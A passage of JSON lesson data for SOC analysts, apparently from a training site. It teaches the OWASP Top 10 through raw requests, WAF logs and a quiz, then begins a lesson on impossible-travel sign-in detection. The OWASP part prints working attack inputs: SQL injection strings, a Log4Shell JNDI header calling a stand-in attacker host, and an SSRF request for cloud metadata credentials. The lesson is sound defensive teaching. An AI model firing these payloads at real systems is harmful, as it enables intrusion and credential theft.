  "slug": "owasp-top-10-tour",
  "title": "The OWASP Top 10: A SOC Analyst's Field Guide",
  "topic": "Web Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "The OWASP Top 10 is the industry's most-cited list of the most critical web application security risks, refreshed roughly every four years by the Open Worldwide Application Security Project. This lesson assumes you have never read a raw HTTP request before, so we start from zero: what a web request and response actually are, what a status code means, and how a browser and a server talk to each other. Once that foundation is solid, we tour all ten categories of the 2021 edition, defining every term as we go, with a real crafted request shown for each major attack type. Then we spend real time on the part that matters most for a SOC: what each category looks like in a raw request, an access-log line, and a WAF alert, and how an analyst turns a suspicious line of text into a triaged verdict through a full worked investigation. For a SOC analyst, the list is not just a developer checklist: it is a map of what attackers try against your web tier every single day, and it tells you exactly which log signatures to hunt for. By the end of this lesson you should be able to look at a raw request in a log and say, with confidence, which OWASP category it belongs to, how urgent it is, and what to do next.",
  "sections": [
    {
      "heading": "Start Here: What a Web Request Actually Is",
      "content": "### The restaurant analogy\n\nImagine ordering food at a restaurant. You (the customer) hand the waiter a specific request: 'one burger, no onions, extra fries.' The kitchen (the server) prepares it, and the waiter brings back a plate — or, if something went wrong, comes back and says 'sorry, we're out of buns' (an error). Every interaction between your browser and a website works the same way. Your browser is the customer, the web server is the kitchen, and the conversation between them is called **HTTP** — **HyperText Transfer Protocol**, the language browsers and servers speak. This lesson assumes zero prior knowledge of HTTP, so we build it from here.\n\n### What a request looks like\n\nWhen your browser wants a web page, it sends an **HTTP request**. A request has four parts worth knowing:\n\n- **Method** — the verb, what you want to do. `GET` means 'give me this'; `POST` means 'here is data, do something with it' (like submitting a login form).\n- **URL** — the address, broken into a **host** (which server, e.g. `shop.example.com`), a **path** (which resource on that server, e.g. `/account`), and often a **query string** (extra parameters after a `?`, e.g. `?id=124`).\n- **Headers** — metadata about the request: which browser sent it (`User-Agent`), any session identifier (`Cookie`), what kind of data is expected back.\n- **Body** — for `POST` requests, the actual data being sent, such as a username and password from a login form.\n\nHere is a real, simple request, read top to bottom:\n\n```\nGET /account?id=124 HTTP/1.1\nHost: shop.example.com\nCookie: session=a1b2c3d4e5f6\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n```\n\nRead it as a sentence: *using HTTP version 1.1, GET the resource at path /account with query parameter id=124, from host shop.example.com, identified by this session cookie, from this browser.*\n\n### What a response looks like\n\nThe server answers with an **HTTP response**, whose most important part is the **status code** — a three-digit number telling you what happened:\n\n| Range | Meaning |\n|-------|---------|\n| 2xx | Success (e.g. 200 OK — the request worked) |\n| 3xx | Redirect (go look somewhere else) |\n| 4xx | Client error (you asked for something wrong — 401 Unauthorized, 403 Forbidden, 404 Not Found) |\n| 5xx | Server error (the server broke while handling your request — 500 Internal Server Error) |\n\n### Why this matters before OWASP makes sense\n\nEvery attack in this lesson is, mechanically, just a **request** — usually one crafted to make the server misbehave — and every clue you will use to detect it lives in that request's method, path, query string, headers, or body, and in the response's status code. Once you can read a request and a status code as a small story, the rest of this lesson is simply learning the ten common ways attackers try to make that story go wrong."
    },
    {
      "heading": "What the OWASP Top 10 Is and Why It Exists",
      "content": "The **OWASP Top 10** is a consensus document that names the ten broad categories of web application risk that matter most. **OWASP** stands for the **Open Worldwide Application Security Project**, a non-profit foundation that publishes free security guidance. The list is rebuilt from data contributed by dozens of firms plus a community survey, so its rankings reflect how often each weakness actually appears in tested applications, not just how scary it sounds.\n\nThe 2021 revision changed shape from earlier editions. Categories were merged and renamed to describe **root causes** rather than single symptoms. For example, the old 'Sensitive Data Exposure' became **A02 Cryptographic Failures**, pointing at the underlying cause instead of the visible result. Three categories were entirely new, added partly from the community survey because tooling struggles to detect them automatically.\n\nWhy should a SOC analyst care about a list aimed at developers? Because every category maps to attacker behaviour you can see in logs, using exactly the request anatomy from the previous section. When you read web server access logs, WAF alerts, or application logs, you are watching people probe for these ten weaknesses with crafted methods, paths, query strings, and bodies. Knowing the categories lets you turn a raw HTTP request into a hypothesis: a burst of `../../etc/passwd` strings in a path is a path-traversal attempt tied to **A01 Broken Access Control**; a `' OR 1=1--` payload in a query string is **A03 Injection**.\n\nThe list is deliberately broad. Each entry is a **category** containing many specific **CWE** (Common Weakness Enumeration) identifiers, not a single bug. This breadth is a strength for detection engineering: you can build alert logic per category and cover a whole family of attacks at once, rather than writing one signature per exploit variant.\n\nThe Top 10 also maps onto **MITRE ATT&CK**, the industry's shared vocabulary for attacker behaviour. Most of what you will read here falls under **T1190, Exploit Public-Facing Application** — the technique for compromising an internet-facing app, server, or service through a software vulnerability or misconfiguration. Keeping that ATT&CK ID in mind helps you write tickets and detections that other teams, and other tools, already understand.\n\nTreat the Top 10 as your shared vocabulary with developers, penetration testers, and incident responders so that when an alert fires, everyone understands both the technique and the fix being discussed. The next two sections tour all ten categories, with a real crafted request for each of the ones you are most likely to see."
    },
    {
      "heading": "A01 to A05: Access, Crypto, Injection, Design, Misconfig",
      "content": "**A01 Broken Access Control** rose to number one in 2021. It means users can act outside their intended permissions. Recall the request anatomy from the primer: this attack lives entirely in the **query string**.\n\n```\nGET /account?id=123 HTTP/1.1\nHost: shop.example.com\nCookie: session=alice-session-token\n```\n\nAlice, legitimately signed in, sees her own account. Now she — or an attacker who stole nothing more than curiosity — simply edits the query string:\n\n```\nGET /account?id=124 HTTP/1.1\nHost: shop.example.com\nCookie: session=alice-session-token\n```\n\nSame session cookie, one digit changed, and the server hands back account 124's data anyway. This is called an **IDOR** (Insecure Direct Object Reference), because the server trusted the `id` value in the URL instead of checking whether the signed-in session is actually allowed to see account 124. In logs you see authenticated users touching resources they should never reach, or a burst of `403 Forbidden` responses as an attacker walks through sequential IDs.\n\n**A02 Cryptographic Failures** covers weak, missing, or misused encryption: passwords stored unhashed, TLS not enforced, or old ciphers accepted. The concrete example is a login form served over plain `HTTP` instead of `HTTPS`, letting an attacker on the same network read the `Cookie` and body of the request in transit.\n\n**A03 Injection** groups **SQL injection**, command injection, and cross-site scripting (**XSS**). Untrusted input is interpreted as code instead of data. Take a normal search request and corrupt its query string:\n\n```\nGET /search?q=widget%27%20OR%20%271%27%3D%271 HTTP/1.1\nHost: shop.example.com\n```\n\nURL-decoded, that query parameter reads `q=widget' OR '1'='1` — a payload crafted so the database's `WHERE` clause always evaluates true, returning every row instead of just products matching 'widget'. Access logs and WAF alerts often show the payload sitting in plain sight inside the query string, exactly where you'd look after reading the primer.\n\n**A04 Insecure Design** is a higher-level category about flaws baked into the architecture rather than the code, such as a password-reset flow with no rate limiting or anti-automation. You cannot patch your way out of a bad design; it must be re-thought using threat modelling.\n\n**A05 Security Misconfiguration** covers default passwords, verbose error pages, unnecessary open features, and forgotten files. A frequent concrete example:\n\n```\nGET /.env HTTP/1.1\nHost: shop.example.com\n```\n\nreturning `200 OK` with database credentials in the body, because the web server was configured to serve dotfiles instead of blocking them — nothing was 'hacked', a misconfigured server simply answered a request it should have refused.\n\n| Rank | Category | One quick signal |\n|------|----------|------------------|\n| A01 | Broken Access Control | spikes of 403s, sequential-ID IDOR patterns |\n| A02 | Cryptographic Failures | plain HTTP logins, weak TLS |\n| A03 | Injection | SQL/script payloads in the query string or body |\n| A04 | Insecure Design | missing rate limits by design |\n| A05 | Security Misconfiguration | default creds, exposed files, open panels |\n\nFor an analyst, these five drive the majority of noisy, high-volume web attack traffic you will triage day to day."
    },
    {
      "heading": "A06 to A10: Components, Auth, Integrity, Logging, SSRF",
      "content": "**A06 Vulnerable and Outdated Components** is about running libraries, frameworks, or servers with known flaws. The defining real-world example is **Log4Shell** (CVE-2021-44228) in the Log4j logging library. The attack is almost unsettling in its simplicity — it doesn't need a special endpoint, just any field the application happens to log:\n\n```\nGET /api/login HTTP/1.1\nHost: app.example.com\nX-Api-Version: ${jndi:ldap://attacker.example.net:1389/Exploit}\n```\n\nA vulnerable Log4j evaluates the `${jndi:...}` lookup inside that ordinary-looking custom header, reaches out to attacker infrastructure, and can be tricked into running attacker-supplied code — all triggered by one header value the developer never expected to be 'executable'. If you cannot inventory your dependencies, you cannot know your exposure; threat intel feeds and vulnerability scanners feed this category.\n\n**A07 Identification and Authentication Failures** covers weak login controls: credential stuffing, brute force, session tokens that never expire, or missing multi-factor authentication (**MFA**). In sign-in logs you spot it as many failed logins across accounts (`POST /login` returning `401` repeatedly), or one account failing from many countries. This is prime SOC hunting ground.\n\n**A08 Software and Data Integrity Failures** covers code and data trusted without verifying integrity, such as auto-updates pulled from an unsigned source or a compromised CI/CD pipeline. The **SolarWinds** supply-chain attack is the headline example, where a trusted software update shipped malware to thousands of customers.\n\n**A09 Security Logging and Monitoring Failures** is the category SOC analysts feel most personally. If applications do not log authentication, access-control denials, and server-side errors, or if those logs are never reviewed, breaches go undetected for months. OWASP notes that most breaches are found by external parties, not internal monitoring, because of this gap. Weak logging directly lengthens **dwell time** — the period an attacker sits undetected inside the environment.\n\n**A10 Server-Side Request Forgery (SSRF)** was added by community vote. An attacker tricks the server into making a request to a destination the attacker chooses, instead of the destination the feature was meant for:\n\n```\nPOST /fetch-preview HTTP/1.1\nHost: app.example.com\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role\n```\n\nA feature meant to fetch a link preview from the public internet is instead pointed at `169.254.169.254`, the cloud **metadata service** address, tricking the server into requesting — and returning — its own temporary cloud credentials. You see this as unexpected outbound connections from your web servers to internal or link-local IPs that a link-preview feature has no business reaching.\n\nTogether these five are lower-volume but often higher-impact. A single exploited outdated component or one SSRF into cloud metadata can hand an attacker a foothold or credentials that no amount of firewall tuning will catch. This is exactly why **A09** matters so much: without good logging and an analyst reading it, the quieter categories succeed silently."
    },
    {
      "heading": "Reading Web Logs Through the OWASP Lens",
      "content": "The value of the Top 10 to a SOC analyst is that it turns abstract requests into named threats you can triage and escalate. When you open web access logs, a WAF console, or application logs, mentally sort each anomaly into a category using exactly the request anatomy from the first section: method, path, query string, headers, body, status code.\n\nHere is a real access-log line, in the widely used Combined Log Format, the kind you will see thousands of per hour:\n\n```\n203.0.113.44 - - [16/Aug/2026:09:14:02 +0000] \"GET /search?q=%27%20UNION%20SELECT%20user%2Cpass%20FROM%20accounts--%20 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.31.0\"\n```\n\nRead it left to right: source IP `203.0.113.44`, timestamp, the request line (a URL-encoded `UNION SELECT` payload against `/search` — **A03 Injection**), a `500` status (the backend choked on the malformed query), 512 bytes returned, no referrer, and a `User-Agent` of `python-requests` — a scripted client, not a browser, which is itself a mild extra signal on a public-facing search box meant for humans.\n\nStatus codes are your fast filter:\n\n- **200** on a sensitive resource by the wrong user: possible **A01** access-control break that succeeded.\n- **403 Forbidden** in bursts: someone probing authorization boundaries.\n- **500 Internal Server Error** clustered around odd input: backend choking on an **injection** attempt.\n- Unexpected **outbound** requests from a server to internal or metadata IPs: **A10 SSRF**.\n\nCorrelation matters more than any single line. One SQL-looking string might be a false positive from a security scanner; a hundred variations followed by a large `200` response body suggests successful data extraction. Pivot from the web log to the database or identity logs to confirm impact.\n\nFinally, remember **A09**. Your ability to do all of the above depends on applications actually emitting useful logs, and on those logs reaching your SIEM with accurate timestamps and source IPs. Part of a mature SOC's job is pushing developers to log authentication events, access-control denials, and server-side failures. When you request a new log source or a richer field, you are directly reducing the organisation's dwell time. The OWASP Top 10 gives you the language to justify exactly which events you need and why each one matters."
    },
    {
      "heading": "A Worked Investigation: From Alert to Verdict",
      "content": "Theory becomes useful once you can walk an alert to a verdict. Suppose your WAF fires the following record:\n\n```\n{\n  \"action\": \"BLOCK\",\n  \"httpRequest\": {\n    \"clientIp\": \"203.0.113.44\",\n    \"uri\": \"/search\",\n    \"args\": \"q=%27%20UNION%20SELECT%20user%2Cpass%20FROM%20accounts--%20\",\n    \"httpMethod\": \"GET\"\n  },\n  \"terminatingRuleId\": \"AWSManagedRulesSQLiRuleSet\",\n  \"terminatingRuleType\": \"MANAGED_RULE_GROUP\"\n}\n```\n\nWalk it the same way you walked the raw request in section one: `httpMethod` is `GET`, `uri` is `/search`, and `args` (the query string) carries a `UNION SELECT` payload — this is squarely **A03 Injection**, and a managed rule already blocked it. That single fact changes your triage path completely.\n\n### The triage checklist\n\n1. **Was it blocked or allowed?** `action: BLOCK` means the WAF stopped the request before it reached the application — lower urgency, but still worth logging the source IP for pattern-of-life.\n2. **Check the volume from this source.** Pivot to the access logs for `clientIp=203.0.113.44` over the last hour. One blocked attempt is noise; two hundred blocked attempts trying different payload variations is an automated scanner or an attacker fingerprinting your defences.\n3. **Check whether anything got through.** Search the same source IP for requests that were **allowed** (status `200`) rather than blocked, especially on the same path or parameter. A single `200` with an unusually large response body after a string of `BLOCK`s is the moment an attacker found a bypass.\n4. **Correlate downstream.** If injection reached the backend, pivot to database logs: did an unusual query run around that timestamp? Did data volume returned to the application spike?\n5. **Decide.** All blocked, low volume, single source: log and close as a routine scan. Any allowed request with a suspicious payload, or a volume spike from one source: escalate, and consider a temporary IP block or rate limit while you confirm impact.\n\n### Why order matters\n\nNotice the sequence: classify the category first (what is being attempted), then measure volume and outcome (was it blocked, did anything succeed), then correlate downstream (did it matter). Skipping straight to 'block the IP' without checking whether the attack already succeeded is a common beginner mistake — containment matters, but so does knowing whether you are already too late and need to widen the investigation into the database and identity layers."
    },
    {
      "heading": "Detection and Defence in Practice",
      "content": "Knowing the categories is only half the job; a SOC also shapes how these attacks are caught and stopped before an analyst ever sees them.\n\n### Where detection lives\n\nA **Web Application Firewall (WAF)** sits in front of the application and inspects each request's method, path, query string, headers, and body against rules before deciding to allow or block — exactly the fields this lesson has taught you to read. Managed rule groups (like the `AWSManagedRulesSQLiRuleSet` from the worked example) cover known **A03 Injection** and **A07** brute-force patterns out of the box; custom rules let a SOC add business-specific logic, such as blocking any request whose `url` parameter resolves to `169.254.169.254` — a direct, cheap defence against **A10 SSRF**.\n\nRate limiting is the standard defence against automation: **A04 Insecure Design** issues like an unthrottled password-reset endpoint, and **A07** credential stuffing, are both blunted by capping how many requests a single IP or account can make per minute.\n\n### Where prevention lives\n\nMuch of the Top 10 is ultimately fixed in code, not in the SOC, and knowing the fix helps you write a more useful ticket to developers:\n\n- **A01/A03**: enforce access checks server-side on every request, and use **parameterized queries** (prepared statements) so user input is always treated as data, never as code — this alone eliminates classic SQL injection.\n- **A02**: enforce TLS everywhere, hash passwords with a modern algorithm, and disable outdated ciphers.\n- **A05**: remove default credentials, disable directory listing and dotfile serving, and use configuration scanners in CI/CD.\n- **A06**: maintain a **software bill of materials (SBOM)** and patch known-vulnerable components on a schedule, not only after a headline CVE like Log4Shell.\n- **A09**: log every authentication event, every access-control denial, and every server-side error, with accurate timestamps and source IPs, and ship them to the SIEM.\n\n### The SOC's role in closing the loop\n\nYou are rarely the one writing the parameterized query, but you are often the one who first proves the gap exists, through exactly the log-reading workflow in this lesson. A well-written incident ticket names the OWASP category, shows the raw request or log line as evidence, states whether the attempt was blocked or succeeded, and recommends the concrete fix category (rate limit, patch, code fix, logging gap). That combination, technical evidence plus the shared OWASP vocabulary, is what gets a fix prioritised by a development team that does not live in log files the way you do."
    }
  ],
  "keyTakeaways": [
    "Every attack in this lesson is mechanically just an HTTP request: a method, a URL (host, path, query string), headers, and a body, answered by a status code — learn to read those fields and the rest of the OWASP Top 10 becomes concrete instead of abstract.",
    "The OWASP Top 10 (2021) ranks web risk categories by real-world prevalence and maps to MITRE ATT&CK T1190 (Exploit Public-Facing Application); A01 Broken Access Control is number one, and each category has a signature shape in a request or log line.",
    "A01-A05 (Access Control, Cryptographic Failures, Injection, Insecure Design, Misconfiguration) drive high-volume noisy traffic; A06-A10 (Vulnerable Components, Auth Failures, Integrity Failures, Logging Failures, SSRF) are lower-volume but often higher-impact, and A09 determines whether any of the other nine can even be detected.",
    "Triage follows a fixed order: classify the category from the request, measure volume and whether the attempt was blocked or allowed, correlate downstream to see if it succeeded, then decide — escalating only allowed/successful attempts or clear volume spikes.",
    "Detection (WAF rules, rate limiting) and prevention (parameterized queries, TLS, patching, SBOMs, complete logging) work together, and a good SOC ticket names the category, shows the evidence, and states the fix — the shared OWASP vocabulary is what gets it prioritised."
  ],
  "quiz": [
    {
      "question": "You are reviewing web server logs and notice one external IP sending dozens of requests where the query string contains strings like ' OR '1'='1 and UNION SELECT, several of which returned HTTP 500 errors. Which OWASP Top 10 2021 category best describes this activity?",
      "options": [
        {
          "label": "A02 Cryptographic Failures, because the attacker is trying to break the site's TLS encryption to read data.",
          "value": "a"
        },
        {
          "label": "A03 Injection, because untrusted input is being crafted so the database interprets it as SQL commands.",
          "value": "b"
        },
        {
          "label": "A07 Authentication Failures, because the attacker is guessing many different account passwords.",
          "value": "c"
        },
        {
          "label": "A10 Server-Side Request Forgery, because the server is being forced to reach an attacker-chosen URL.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The ' OR '1'='1 and UNION SELECT payloads are classic SQL injection, which falls under A03 Injection: untrusted input is interpreted as database code. The 500 errors suggest the backend is choking on malformed queries. A02 is wrong because nothing here targets TLS or encryption. A07 is wrong because these are injection payloads, not password guessing across accounts. A10 is wrong because SSRF involves forcing the server to make outbound requests, not sending SQL in a query string."
    },
    {
      "question": "Your incident review finds that a breach went undetected for four months because the application never logged failed authorization checks and no one monitored the logs it did produce. Which category most directly names this weakness, and why does it matter to a SOC?",
      "options": [
        {
          "label": "A05 Security Misconfiguration, since default settings were left unchanged on the web server.",
          "value": "a"
        },
        {
          "label": "A01 Broken Access Control, since users were able to reach resources beyond their permissions.",
          "value": "b"
        },
        {
          "label": "A09 Security Logging and Monitoring Failures, since missing logs and review let the breach stay hidden.",
          "value": "c"
        },
        {
          "label": "A06 Vulnerable and Outdated Components, since an unpatched library gave the attacker their foothold.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Missing authorization logging plus no monitoring is exactly A09 Security Logging and Monitoring Failures, which OWASP added because most breaches are found by outsiders due to this gap; it directly increases dwell time. A05 concerns insecure configuration, not absent logging. A01 describes the access break itself, but the question asks about why it stayed hidden. A06 concerns outdated components, which is not what the scenario describes."
    },
    {
      "question": "A web server begins making outbound requests to 169.254.169.254 shortly after receiving a POST request whose body includes a url parameter pointing to that same address, submitted through a public 'link preview' feature. Which OWASP category and consequence does this best match?",
      "options": [
        {
          "label": "A10 SSRF, because the server was tricked into requesting the cloud metadata service and could leak its own temporary credentials.",
          "value": "a"
        },
        {
          "label": "A04 Insecure Design, because rate limiting on the preview feature was never implemented for this specific endpoint.",
          "value": "b"
        },
        {
          "label": "A02 Cryptographic Failures, because the metadata address is only reachable when TLS has been misconfigured.",
          "value": "c"
        },
        {
          "label": "A08 Integrity Failures, because the link preview feature pulled an unsigned software update from that address.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Forcing a server-side feature to request 169.254.169.254, the cloud metadata service, so it returns the server's own credentials is the textbook A10 SSRF pattern described in this lesson. B is wrong because the issue is the server making an attacker-chosen request, not a missing rate limit. C is wrong because TLS configuration is unrelated to reaching a link-local metadata address. D is wrong because nothing here involves an unsigned update or CI/CD pipeline, which is what A08 covers."
    }
  ],
  "references": [
    "https://owasp.org/Top10/",
    "https://owasp.org/www-project-top-ten/",
    "https://cheatsheetseries.owasp.org/",
    "https://attack.mitre.org/techniques/T1190/",
    "https://portswigger.net/web-security"
  ],
  "xp": 260,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-impossible-travel-signin-anomalies",
  "slug": "impossible-travel-signin-anomalies",
  "title": "Impossible Travel and Cloud Sign-in Anomalies",
  "topic": "Cloud Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When an account signs in from Tel Aviv and then from São Paulo eleven minutes later, no human made that trip. Impossible travel is one of the most reliable behavioural signals that credentials have been stolen. This lesson assumes no prior identity background: it starts by defining what a sign-in, a session, and a token actually are, then covers impossible travel and the family of cloud sign-in anomalies around it, how identity providers like Microsoft Entra ID Protection score them using real sign-in log fields, why benign activity triggers false positives, and how a SOC analyst investigates and responds using a full worked log walkthrough and a detection query.",
  "sections": [
    {
      "heading": "Start Here: What Signing In, a Session, and a Token Actually Are",
      "content": "### The keycard analogy\n\nImagine an office building with a front-desk security guard. You show your ID once at the door (this is **authentication** — proving who you are), and in exchange the guard hands you a temporary visitor badge that lets you move around for the rest of the day without showing your ID at every single door (this is a **session**). If someone steals your badge, they can walk through every door your badge allows, without ever having to fool the guard at the front desk again. Cloud identity works exactly this way, and almost every concept in this lesson maps onto that badge.\n\n### What is a sign-in?\n\nA **sign-in** (or **authentication event**) is the moment a user proves their identity to an **identity provider** — a service like **Microsoft Entra ID** (formerly Azure Active Directory), Okta, or Google Workspace, whose entire job is to be the 'front-desk guard' for every app the organisation uses. A sign-in typically requires a **password** and, ideally, a second proof called **multi-factor authentication (MFA)** — something you have (a phone) or something you are (a fingerprint), in addition to something you know (the password).\n\n### What is a session and a token?\n\nOnce authentication succeeds, the identity provider issues a **token** — a small, cryptographically signed piece of data that acts as the visitor badge. The application you are using (email, a file share, a chat app) checks that token instead of re-asking for your password on every single click. A **session** is the period during which that token (or a **refresh token** that quietly renews it) remains valid. This is why you do not retype your password every time you open a new email — your badge is still valid.\n\n### Why this matters for detecting theft\n\nBecause the badge, not a fresh ID check, controls access after the first sign-in, an attacker's goal is almost always to either steal the password and sign in themselves, or steal an already-issued token and skip authentication entirely. Either way, the identity provider logs the event, and that log is the evidence trail this entire lesson teaches you to read. The single fact that makes impossible travel possible to detect is that **every sign-in records where it came from and when** — and a legitimate person, unlike a stolen credential used from two places, can only be in one place at a time."
    },
    {
      "heading": "What Impossible Travel Means",
      "content": "**Impossible travel** is a detection that fires when a single account authenticates from two geographically distant locations within a time window too short to physically travel between them. If a sign-in from Israel is followed forty minutes later by a sign-in from the United States, the implied travel speed exceeds any aircraft, so at least one of those sessions is not the legitimate user.\n\n### The maths behind it\n\nThe detection works by comparing the **source IP geolocation** and **timestamp** of consecutive sign-ins for the same identity. The provider estimates the distance between the two locations and divides by the elapsed time to get an implied speed. Take a concrete pair: Tel Aviv to São Paulo is roughly 10,700 kilometres. If the second sign-in occurs 11 minutes after the first, the implied speed is about 58,000 km/h — far beyond even the fastest military aircraft, let alone a commercial flight (which tops out around 900 km/h). When that implied speed crosses a threshold, or the two locations are simply implausible given the gap, the sign-in is flagged as anomalous.\n\nMicrosoft classifies this under **Entra ID Protection** as an **offline risk detection**, meaning it can surface shortly after the events rather than instantly, because it needs to observe the pair before it can do the distance-over-time calculation above.\n\n### Why it targets behaviour, not credentials\n\nImpossible travel is powerful because it targets **behaviour, not credentials**. An attacker who has phished a valid password and even satisfied MFA still cannot be in two places at once. When their session originates from a different country than the real user's normal pattern, the geographic contradiction exposes the compromise even though every credential was technically correct.\n\n### The detection needs a baseline\n\nThe detection needs a **baseline**. Providers learn each user's familiar locations, devices, and typical travel over time. Early in a user's history, or right after onboarding, there is little baseline, so the system is more cautious. Once a pattern of, say, Tel Aviv weekdays and occasional Jerusalem is established, a sudden authenticated session from Nigeria stands out sharply.\n\nIn practice, impossible travel rarely fires alone in a real intrusion. It usually appears alongside other signals such as an unfamiliar sign-in, an anonymous IP, or a new device. Correlating it with those companions, using the actual sign-in log fields covered in the next sections, is what separates a genuine account takeover from a noisy one-off."
    },
    {
      "heading": "The Wider Family of Sign-in Anomalies",
      "content": "Impossible travel is one member of a broader set of **sign-in risk detections**. A SOC analyst should recognise the whole family because attackers trip several of them at once.\n\n**Unfamiliar sign-in properties** fires when the combination of IP, device, browser, and location does not match the user's learned history. It is a machine-learning signal that weights many attributes, so a user logging in from a brand-new country on an unseen device scores high.\n\n**Anonymous IP address** flags sign-ins routed through anonymising infrastructure such as the **Tor** network or anonymising VPNs. Legitimate users occasionally use these, but attackers use them heavily to hide origin, so the signal is meaningful.\n\n**Malicious IP address** and **password spray** detections tie a sign-in to IPs known for attacks or to a pattern where one password is tried against many accounts. **Atypical token** or **token anomaly** detections notice sign-in tokens with unusual characteristics, which can indicate **token theft**, where an attacker replays a stolen session token (the visitor badge itself) rather than a password.\n\n**MFA fatigue**, also called **MFA bombing** or push-notification spamming, is not a single log line but a pattern: repeated MFA prompts to a user until they approve one out of annoyance. In logs you see many MFA challenges in quick succession, most denied, then one approval. This maps to attacker techniques for prompt bombing and is a rising cause of takeovers.\n\n| Signal | What it indicates |\n|--------|-------------------|\n| Impossible travel | Two distant logins, too fast |\n| Unfamiliar properties | New IP/device/location combo |\n| Anonymous IP / Tor | Origin deliberately hidden |\n| Atypical token | Possible session token replay |\n| MFA fatigue | Repeated prompts until approval |\n\nEach of these can be low or high severity on its own. Their real diagnostic power comes from **stacking**: a single account that in one hour shows an anonymous IP, unfamiliar properties, impossible travel, and a burst of denied MFA prompts is almost certainly compromised. Learning to read the family together, rather than chasing each alert in isolation, is the core skill of cloud sign-in investigation, and it maps to **MITRE ATT&CK T1078.004, Valid Accounts: Cloud Accounts** — the attacker is not exploiting a bug, they are simply using a stolen valid identity."
    },
    {
      "heading": "How Identity Providers Score Risk",
      "content": "Modern identity platforms do not just raise binary alarms; they assign a **risk level** using machine learning over many signals, and they record that score directly on the sign-in log entry. In **Microsoft Entra ID Protection**, two related concepts drive this: **risky sign-ins** and **risky users**.\n\nA **risky sign-in** is a single authentication event scored as **low**, **medium**, or **high** risk based on detections like the ones above. A **risky user** is an account whose accumulated risk across sessions suggests the identity itself may be compromised. The distinction matters operationally: you might block one suspicious sign-in, or you might force a full password reset and revoke sessions for a user whose overall risk is high.\n\nHere is what one of these scored sign-ins actually looks like as a log record, using real Entra sign-in log field names:\n\n```\n{\n  \"createdDateTime\": \"2026-08-16T09:00:14Z\",\n  \"userPrincipalName\": \"d.cohen@contoso.com\",\n  \"appDisplayName\": \"Office 365 Exchange Online\",\n  \"ipAddress\": \"5.102.44.19\",\n  \"location\": { \"city\": \"Tel Aviv\", \"countryOrRegion\": \"IL\" },\n  \"clientAppUsed\": \"Mobile Apps and Desktop clients\",\n  \"deviceDetail\": { \"isCompliant\": true, \"trustType\": \"AzureAD\" },\n  \"status\": { \"errorCode\": 0 },\n  \"riskLevelDuringSignIn\": \"none\",\n  \"riskState\": \"none\"\n}\n```\n\nEach field answers a specific question: `userPrincipalName` is who, `createdDateTime` and `ipAddress`/`location` are when and where, `deviceDetail.isCompliant` tells you whether the device meets company policy, `status.errorCode` of `0` means the sign-in succeeded, and `riskLevelDuringSignIn` is the score this whole lesson is building toward reading correctly.\n\nEntra separates detections into **real-time** and **offline**. Real-time detections evaluate during the sign-in itself and can feed an immediate Conditional Access decision, such as demanding MFA or blocking. Offline detections, including impossible travel, are computed after the fact by correlating events, and they raise the user's risk state so policy can respond on the next sign-in. This is why impossible travel may appear in your console minutes after the actual logins.\n\nCrucially, these scores are **inputs to policy, not verdicts**. A high-risk sign-in does not automatically mean breach; it means the platform's model estimated elevated likelihood. The organisation decides what to do at each band through **Conditional Access** and risk policies, for example requiring MFA at medium risk and blocking at high (covered in depth in the Conditional Access lesson). As an analyst, treat the risk level as a prioritisation aid that tells you where to look first, then apply human judgement and correlation before you conclude an account is truly taken over."
    },
    {
      "heading": "A Worked Sign-in Log Walkthrough",
      "content": "Let's put every concept so far to work on a real pair of consecutive log entries, the way you would in a queue. The first entry is the one shown in the previous section, at `09:00:14Z` from Tel Aviv. Here is the second, for the same user, 11 minutes 38 seconds later:\n\n```\n{\n  \"createdDateTime\": \"2026-08-16T09:11:52Z\",\n  \"userPrincipalName\": \"d.cohen@contoso.com\",\n  \"appDisplayName\": \"Office 365 Exchange Online\",\n  \"ipAddress\": \"191.96.12.203\",\n  \"location\": { \"city\": \"Sao Paulo\", \"countryOrRegion\": \"BR\" },\n  \"clientAppUsed\": \"Browser\",\n  \"deviceDetail\": { \"isCompliant\": false, \"trustType\": \"\" },\n  \"status\": { \"errorCode\": 0 },\n  \"riskLevelDuringSignIn\": \"high\",\n  \"riskState\": \"atRisk\",\n  \"riskEventTypes_v2\": [\"unfamiliarFeatures\", \"anonymizedIPAddress\"]\n}\n```\n\n### Reading it field by field\n\n- **Same `userPrincipalName`, both `status.errorCode: 0`** — both sign-ins succeeded, so the account's credentials (and, if configured, MFA) were satisfied both times.\n- **Geography and time**: Tel Aviv to São Paulo is roughly 10,700 km, and only 11 minutes 38 seconds separate them — an implied speed no aircraft can achieve. This alone is the impossible-travel trigger.\n- **`deviceDetail.isCompliant: false` and empty `trustType`** — unlike the first sign-in's managed, compliant device, this one came from a device Entra has never registered or trust-checked, consistent with an attacker's own machine.\n- **`clientAppUsed` changed** from 'Mobile Apps and Desktop clients' to 'Browser' — a different client entirely, another break from this user's normal pattern.\n- **`riskLevelDuringSignIn: high`** plus **`riskEventTypes_v2`** listing `unfamiliarFeatures` and `anonymizedIPAddress` — Entra is telling you, in the log itself, exactly which of the family of signals from the earlier section fired together.\n\n### The verdict\n\nStack these facts the way the earlier section taught: impossible travel, an uncompliant/untrusted device, a changed client app, and an anonymised IP, all on one account within 12 minutes. No single field proves compromise on its own, but the combination is precisely the 'several signals firing on the same account at once' pattern that separates a genuine takeover from a lone false positive. This is a high-confidence case for immediate response, covered next."
    },
    {
      "heading": "False Positives, Investigation, and Response",
